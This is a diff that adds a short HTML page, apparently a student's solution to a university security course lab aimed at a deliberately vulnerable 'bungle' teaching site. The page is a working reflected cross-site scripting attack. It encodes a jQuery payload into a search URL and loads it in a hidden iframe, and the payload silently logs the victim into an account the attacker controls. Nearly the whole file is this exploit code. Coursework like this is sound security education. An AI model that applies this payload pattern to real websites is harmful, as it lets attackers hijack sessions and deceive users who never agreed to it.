@@ -1,0 +1,39 @@
+<html>
+<head>
+<title>sus</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+  function payload(){
+    function proxy(href, first=false){
+      $('html').hide();
+      $('html').load(href, function() {
+        $('html').show();
+        $('#username').val("attacker")
+        $('#userpass').val("l33th4x")
+        $('#log-in-btn').trigger('click')
+      });
+    }
+    proxy('./')
+  }
+
+  function makeLink(target){
+    payload_string = payload.toString();
+    return target + "&q=" +
+      encodeURIComponent(
+        "<script>" +
+        payload_string +
+        ";payload();" +
+        "</script" + ">"
+      );
+  }
+  var target = `http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0`;
+  $(function() {
+    $("#frame").html("<iframe name=\"Z\" src=\"" + makeLink(target) + "\"width=\"900\" height=\"600\" style=\"visibility:hidden\"></iframe>")
+  });
+</script>
+</head>
+<body>
+  <!-- search of a proxy to homepage -->
+  <h3 id="frame"></h3>
+</body>
+</html>
